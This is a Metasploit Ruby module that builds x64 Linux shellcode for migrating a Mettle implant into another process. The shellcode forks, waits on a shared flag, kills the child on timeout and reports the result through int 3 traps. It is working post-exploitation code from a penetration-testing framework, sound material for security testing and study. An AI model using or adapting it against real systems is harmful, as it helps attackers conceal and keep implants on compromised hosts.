# -*- coding: binary -*-
# frozen_string_literal: true

module Msf
  # Payload that supports migration on x64.
  module Payload::Linux::X64::Migrate
    def initialize(info = {})
      super(
        update_info(
          info,
          'Name' => 'Linux Migration (x64)',
          'Description' => 'Migration stub x64',
          'Author' => ['Rapid7'],
          'License' => MSF_LICENSE,
          'Platform' => 'linux',
          'Arch' => ARCH_X64
        )
      )
    end

    #
    # Constructs the migrate stub on the fly.
    #
    def generate(opts = {})
      # rax - payload address
      # rbx - pid of the current Mettle process
      # rcx - file descriptor of the current transport
      # rdx - address of a shared child-readiness word
      asm = %(
      push rax
      push rcx
      push rbx
      push rdx
      mov r12, rdx
      mov rax, 57
      syscall                   ; fork()
      test rax, rax
      jz migrate_child
      js migrate_failed_result

      mov r13, rax             ; child pid
      mov r14d, 3000           ; 30 seconds at 10 ms per iteration
    migrate_wait:
      cmp dword [r12], 1
      je migrate_ready
      cmp dword [r12], 0
      jne migrate_failed_parent
      sub rsp, 16
      mov qword [rsp], 0
      mov qword [rsp + 8], 10000000
      mov rdi, rsp
      xor esi, esi
      mov eax, 35              ; nanosleep({ 0, 10000000 }, NULL)
      syscall
      add rsp, 16
      dec r14d
      jnz migrate_wait

    migrate_failed_parent:
      cmp dword [r12], 0
      jne migrate_failed_result
      test r13, r13
      jle migrate_failed_result
      mov rdi, r13
      mov esi, 9
      mov eax, 62              ; kill(child, SIGKILL)
      syscall
    migrate_failed_result:
      mov eax, dword [r12]
      int 3                    ; report failure and restore the target

    migrate_ready:
      mov eax, 1
      int 3                    ; report success and restore the target

    migrate_child:
      #{generate_migrate(opts)}
    )

      Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
    end
  end
end
